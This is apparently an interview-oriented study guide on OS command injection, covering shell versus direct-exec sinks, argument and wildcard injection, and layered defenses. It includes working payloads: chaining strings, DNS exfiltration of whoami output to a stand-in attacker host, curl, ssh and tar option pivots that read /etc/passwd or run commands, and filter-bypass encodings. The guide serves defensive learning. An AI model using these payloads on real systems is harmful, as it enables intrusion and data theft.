# OS Command Injection

> OS command injection (also called shell injection) exists because the application hands attacker-influenced data to a component that interprets it as a command line rather than as inert data. The decisive detail is which sink you hit: a shell interpreter (`/bin/sh -c "..."`) treats metacharacters like `;`, `|`, `&&`, `$()`, and backticks as structure, so a value spliced into that string can start new commands; a direct exec of one binary with an argument vector does not parse metacharacters at all, but the argument you control can still smuggle that binary's own flags (argument injection). Same root cause as SQLi (data crossing into a code interpreter), and the same shape of fix: do not spawn a shell, pass arguments as a vector, and constrain values so they cannot be read as options.

## How it works

There are two distinct sink families, and the distinction decides everything about exploitability.

1. Shell-interpreted sinks. The string is parsed by a shell, so the full metacharacter grammar is live. In C, `system()` and `popen()` call `/bin/sh -c`. In Python, `os.system`, `os.popen`, and `subprocess.*` with `shell=True`. In Node, `child_process.exec` and `execSync` (both route through a shell). In Ruby, `system("string")`, backticks, and `%x{}`. In PHP, `system`, `exec`, `shell_exec`, `passthru`, and backticks. In Java, `Runtime.exec("sh -c ...")` when you explicitly invoke a shell. This is the dangerous form and where classic injection lives.

2. Direct exec, no shell. The OS runs exactly one named binary with an argument vector, and the kernel `execve(path, argv, envp)` never involves a shell, so `;`, `|`, and `$()` are passed through as literal characters. Java `ProcessBuilder(List<String>)` and `Runtime.exec(String[])`, Node `child_process.execFile`/`spawn` (default `shell:false`), Python `subprocess.run([...], shell=False)`, and Go `exec.Command(name, args...)` all take a vector. OWASP demonstrates the difference: feeding `java -version & cmd /c whoami` to `Runtime.exec` yields return code 0 with no `whoami` output, because everything after `java` becomes inert arguments to the `java` process rather than a new command. Metacharacters are dead here, but see argument injection below.

A canonical vulnerable sink: a stock-checker that shells out `stockreport.pl 381 29`. Submitting `& echo aiwefwlguh &` in the product ID yields `stockreport.pl & echo aiwefwlguh & 29`, and the echoed marker in the response confirms execution. The trailing `&` matters: it separates your injected command from whatever text follows the injection point, so the remainder of the original line cannot break your command.

Initial reconnaissance commands once you have execution:

| Purpose | Linux | Windows |
| --- | --- | --- |
| Current user | `whoami` | `whoami` |
| OS/version | `uname -a` | `ver` |
| Network config | `ifconfig` / `ip a` | `ipconfig /all` |
| Connections | `netstat -an` | `netstat -an` |
| Processes | `ps -ef` | `tasklist` |

## Attack techniques

1. Command chaining (why the metacharacter matters). Separators behave differently and that behavior decides whether you get in-band output or only blind execution.

   ```
   ; cmd          # Unix: run next command unconditionally (sequential)
   \n cmd         # Unix newline (0x0a): also a separator in many contexts
   & cmd          # Unix/Windows: background/separate; original command keeps running
   && cmd         # run cmd only if the previous succeeded (exit 0)
   || cmd         # run cmd only if the previous failed
   | cmd          # pipe previous stdout into cmd
   $(cmd)         # Unix: command substitution, inline; works mid-argument
   `cmd`          # Unix: backtick substitution, inline
   ```

   `$()` and backticks are the ones to reach for when your input sits inside an argument rather than at the end of the statement, because they substitute inline without needing to terminate the current command. If your input lands inside quotes in the original command, close the quote first (`"` or `'`) before the separator.

2. Blind command injection (no command output in the response). Most real cases are blind: the command runs but stdout never reaches you (for example a feedback form that shells out to `mail`). Three escalating confirmations:

   - Time delay as a yes/no oracle. `ping` with a fixed count is the portable timer because it controls duration:

     ```
     & ping -c 10 127.0.0.1 &        # Linux: ~10s
     & ping -n 10 127.0.0.1 &        # Windows: ~10s
     & sleep 10 &                     # Linux
     ```

   - Out-of-band (OAST) network interaction, the most reliable blind channel. Trigger a DNS lookup to infrastructure you control and read your logs:

     ```
     & nslookup kgji2ohoyw.web-attacker.com &
     ```

     Then fold command output into the subdomain so it is exfiltrated in the DNS query itself:

     ```
     & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
     & nslookup $(whoami).kgji2ohoyw.web-attacker.com &
     ```

     This works when all outbound HTTP is filtered but DNS still resolves (the usual case), and it carries data, not just a boolean. Long output is chunked across multiple lookups.

   - Redirect output to a readable location. Write to a file the web server serves, then fetch it:

     ```
     & whoami > /var/www/static/whoami.txt &      # then GET /whoami.txt
     ```

3. Argument injection (the subtle case that survives "we avoid the shell"). OWASP states every OS command injection is also an argument injection: even with a vector-based exec and no shell, if you control a value that is passed as an argument to a known binary, and that value can begin with `-`, the binary parses it as one of its own options. Impact ranges from information disclosure to full RCE depending on the binary. Real, widely-documented option-to-RCE pivots (cataloged by GTFOArgs):

   ```
   # value passed to curl: read/exfil files or load a config that fetches remote flags
   -o /var/www/html/shell.php        # write fetched body to an arbitrary path
   -K http://attacker/curlrc          # -K/--config pulls attacker-controlled options
   --upload-file /etc/passwd          # exfiltrate a local file
   # value passed to ssh/scp/rsync: ProxyCommand runs an arbitrary command
   -o ProxyCommand=;touch /tmp/pwn;
   # value passed to tar: run a command at a checkpoint
   --checkpoint=1 --checkpoint-action=exec=sh\ shell.sh
   # value passed to find: -exec runs a command per match
   . -exec /bin/sh ; 
   # value passed to zip
   --unzip-command=sh -c 'id'
   # value passed to 7z, wget, git (-c core.sshCommand=...), etc.
   ```

   The OWASP curl example is exact: `system("curl " . escape($url))` where `escape` neutralizes `& | ;` still lets `--help` (or `--output`, `--config`) through because it is a valid single argument, not a shell metacharacter. This is why avoiding the shell is necessary but not sufficient; you also need to validate that values do not start with `-` and terminate option parsing.

4. Filter and space bypass (reasoning). When metacharacters or spaces are blocklisted, the shell offers many equivalent encodings because a blocklist models surface syntax, not intent:

   ```
   # spaces removed? use the internal field separator or redirection/brace tricks
   cat${IFS}/etc/passwd
   {cat,/etc/passwd}
   cat</etc/passwd
   # keyword blocklisted? break the token so the filter misses but the shell rebuilds it
   w'h'oami
   wh\oami
   who$@ami
   /bin/cat /e?c/p?sswd            # wildcards dodge literal path filters
   # obfuscate the whole command
   echo d2hvYW1p | base64 -d | sh
   ```

5. Windows specifics. `cmd.exe` uses `&`, `&&`, `||`, `|` as separators, `%VAR%` for environment expansion, and `^` as the escape character. PowerShell adds `;`, `|`, `$(...)` subexpressions, `&` (call operator), and backtick as its escape, plus `IEX`/`Invoke-Expression` as a code-eval sink analogous to `eval`. A payload that is inert in `cmd` may execute in PowerShell and vice versa, so the target shell matters.

6. Environment-variable injection (Shellshock family). If attacker-controlled data reaches the environment of a spawned shell, historic bugs let a crafted variable body execute code. CVE-2014-6271 (Shellshock) is the canonical example: Bash evaluated trailing code after an exported function definition in an environment variable, so CGI handlers that copied HTTP headers into the environment (for example `User-Agent`) and then ran `/bin/bash` executed attacker code. The mechanism (untrusted data controlling the environment of a shell-out) generalizes beyond that specific CVE.

7. Wildcard (glob) injection. Wildcard injection is a distinct pivot from argument injection because the invoker does not need to concatenate user input at all. Any admin or batch job that runs `tar cf backup.tar *`, `chown -R user *`, `rsync -av * remote:`, or `find . -type f` inside a directory whose contents an attacker controls (uploads, `/tmp`, a shared spool, a webroot subfolder) is exposed. The shell expands `*` before exec, and any filename that starts with `-` is passed to the binary as one of its own options, exactly the same way argument injection works, but the "attacker-controlled value" is a filename rather than a form field.

   The classic Leon Juranic payload against `tar`: in a directory the attacker can write to, create three files named `--checkpoint=1`, `--checkpoint-action=exec=sh shell.sh`, and `shell.sh` (the last containing the payload). When the periodic backup job runs `tar cf archive.tar *`, glob expansion turns the two option-looking filenames into real `tar` options, and the checkpoint action fires the shell script, often as root. Equivalent pivots exist for `chown`/`chmod` (`--reference=`), `rsync` (`-e ssh command`), `scp`, `find`, and `zip`.

   Defenses layer on top of the argument-injection controls. Pass paths with an explicit `./` prefix (`tar cf archive.tar ./*` turns `./--checkpoint=1` into a path, not a flag), or enumerate files explicitly instead of globbing. Reject filenames that begin with `-` at upload time and at every ingestion point that lands data in a shared directory. This is why the answer "we do not shell out on user input, we just tar a directory the user uploaded to" is not safe.

8. Second-order (stored) command injection. Not every injection fires at the request-handling sink. A common pattern is that user-supplied data (a username, a filename, a hostname field, a report title) is validated and stored verbatim, and a separate downstream process later concatenates that value into a shell command. Examples that recur in real reviews are a cron job that runs `backup.sh $USER`, a nightly report generator that invokes `pdflatex $TITLE.tex`, and an admin CLI that runs `ping $HOST` against a monitored asset list. The web UI looks clean because its own sink is parameterized or does not shell out at all; the vulnerability lives in the batch process that reads the stored value.

   Interviewers probe this exact seam to see whether you scope threat modeling to the immediate request handler or to the whole data lifecycle. The defense is that taint must follow data across storage boundaries: every downstream consumer that shells out is its own sink and needs the same vector-exec, allowlist, and `--` treatment as the front-door handler. "We validated on write, so read-side is safe" is the wrong mental model, both because write-side validation is often display-oriented (length, uniqueness) rather than shell-safe, and because a second consumer added months later inherits none of the write-time assumptions.

## Defense

1. Do not call a shell. The single most effective control is to use an API that takes an argument vector and execs the binary directly, so no shell parses metacharacters. Use `subprocess.run([...], shell=False)`, `child_process.execFile`/`spawn` with `shell:false`, `ProcessBuilder(List<String>)`, or `exec.Command(name, args...)`. OWASP's `ProcessBuilder` guidance: pass the command and each argument as separate elements, never as one concatenated string.

   ```java
   // Wrong: one string, trivially manipulable
   ProcessBuilder b = new ProcessBuilder("C:\\DoStuff.exe -arg1 -arg2");
   // Right: command and args separated
   ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");
   pb.directory(new File("TrustedDir"));
   Process p = pb.start();
   ```

2. Avoid shelling out at all where a native library exists. Use `mkdir()` instead of `system("mkdir ...")`, an image library instead of calling `convert`, a DNS resolver library instead of `nslookup`, an archive library instead of `tar`. The safest command is the one you never run. This also removes the entire argument-injection surface.

3. Parameterization plus input validation, in two layers (when a shell-out is unavoidable). Layer 1 is a structured mechanism that separates command from data. Layer 2 validates both parts: validate the command against an allowlist of permitted binaries (never let the user choose the executable), and validate arguments with a positive allowlist or a strict regex that excludes metacharacters and whitespace, for example `^[a-z0-9]{3,10}$`. OWASP lists the metacharacters to exclude: `& | ; $ > < \` \ ! ' " ( )`.

4. Neutralize argument injection specifically. Reject values that begin with `-`, and place the POSIX end-of-options delimiter `--` before user-controlled positional arguments so nothing after it is parsed as an option (POSIX Utility Syntax Guideline 10). For example `curl -- "$url"` prevents a malformed `$url` from being read as a flag. Hardcode required options in code, not in user input.

5. Escaping is a fallback, not a primary control. `shlex.quote` (Python), `escapeshellarg` (PHP), and friends can help, but they are fragile and easy to apply to the wrong variable. OWASP notes `escapeshellarg()` is preferable to `escapeshellcmd()` because `escapeshellcmd()` still allows an attacker to inject extra arguments (for example overriding `--directory-prefix` on a `wget` call), which is argument injection again. Treat escaping as defense in depth behind vector-based exec.

6. Least privilege, sandboxing, and egress control (caps blast radius). Run the worker as a low-privileged, single-purpose account, inside a container with seccomp/AppArmor and read-only filesystem where possible, and with no outbound network if the task does not need one. Removing egress specifically kills the OAST/DNS exfiltration channel that blind exploitation depends on. If the process cannot reach the internet and cannot write the docroot, a successful injection is far less useful.

7. Reject blocklist-based sanitization as a primary control. The invariant to enforce is that user data never becomes shell syntax, and a blocklist of metacharacters cannot enforce that invariant for three independent reasons. First, blocklists model surface syntax, not intent: `${IFS}` replaces spaces, `$@` and `\` split tokens without a metacharacter, brace expansion (`{cat,/etc/passwd}`) sidesteps a space filter, wildcard globbing dodges literal path checks, and base64-into-`sh` obfuscates the whole command. Second, even a perfect metacharacter filter does not stop argument injection because `--config`, `-o`, and `--checkpoint-action` are alphanumeric. Third, character filters have to run in exactly the right place: applied to a display name but forgotten on the filename, or applied on write but not on the batch job that reads back, and the control is gone. The correct posture is "we do not build shell strings, period; we use vector exec with an allowlisted binary and a positive-regex allowlist for each argument." Escaping and blocklists are only defense in depth behind that. The common wrong implementation is a request-level regex that strips `; | & $ backtick newline` and declares the endpoint safe.

8. Find these bugs at scale, not one file at a time. The invariant a reviewer or SAST rule enforces is that every shell-invoking sink has a vector call shape with a compile-time-constant command and validated arguments. Finding them at scale is a grep/AST problem before it is a taint problem, in three passes. First pass, enumerate every shell-invoking API in the languages in use: Python `os.system`, `os.popen`, `subprocess.*(..., shell=True)`, `subprocess.Popen` with a string first arg; Node `child_process.exec`/`execSync`, `spawn`/`execFile` with `{shell:true}`; PHP `system`/`exec`/`shell_exec`/`passthru`/backticks; Ruby `system`/`%x`/backticks; Perl `open` with a trailing `|`; Java `Runtime.exec(String)` and `ProcessBuilder(String)` overloads; Go `exec.Command("sh", "-c", ...)`. Anything on that list is a P0 review target regardless of what the arguments look like. Second pass, for vector-based exec sites, flag any argv element that is not a compile-time constant and check for `--` before user positional args plus a no-leading-dash guard. Third pass, hunt for indirection: `xargs`, `eval`, `bash -c`, `sudo` with `env_keep`, `sh` wrappers around otherwise-safe binaries, and template engines that emit shell (Jinja rendering into a `.sh` file). Semgrep and CodeQL both ship maintained rulesets that cover most of pass one and two; the value of a human review is confirming the argument-injection and indirection cases the linters miss. The common wrong implementation is trusting a SAST clean bill for a large repo without auditing the sink inventory the tool actually recognizes.

## Interview-grade nuances

- "We switched from `system()` to `execFile`, so we are safe" is only half right. Vector-based exec kills metacharacter injection but not argument injection; you still need `--` and a no-leading-dash check on user values.
- `Runtime.exec(String)` in Java is not `system()`: it splits on whitespace and does not invoke a shell, so metacharacters become literal arguments. But splitting on whitespace is itself a footgun (quoting is not honored the way a shell would), so prefer the `List`/array form.
- Node's `child_process.exec` vs `execFile` is the exact fault line interviewers probe: `exec` spawns a shell, `execFile` does not. `spawn`/`execFile` with `{shell:true}` re-opens the hole.
- Blind is the common case, not the exception; if `echo <marker>` does not reflect, do not conclude "not vulnerable", pivot to time-based then DNS OAST.
- DNS exfiltration beats HTTP for blind cases because egress firewalls usually allow recursive DNS even when they block outbound TCP; the data rides in the queried hostname.
- `PATH` matters: if the app calls `ping` (unqualified) and you can influence `PATH` or the working directory, you may hijack which binary runs. Prefer absolute paths for the trusted command.
- Recurring real-world offenders are media/report pipelines that shell out: ImageMagick, ffmpeg, Ghostscript, LaTeX/PDF, and any "run this external tool on the uploaded file" feature. These are where argument injection via filenames beginning with `-` shows up.
- Regex allowlists must be anchored (`^...$`) and must not permit whitespace or metacharacters; an unanchored regex that merely "contains" a safe pattern is not validation.

## Sources

- PortSwigger Web Security Academy, OS command injection: https://portswigger.net/web-security/os-command-injection
- OWASP, OS Command Injection Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- OWASP, Injection Prevention Cheat Sheet (OS command section): https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
- OWASP Web Security Testing Guide, Testing for Command Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
- GTFOArgs (argument-injection catalog: curl, ssh, tar, find, zip, and more): https://gtfoargs.github.io/
- CWE-77 Command Injection: https://cwe.mitre.org/data/definitions/77.html
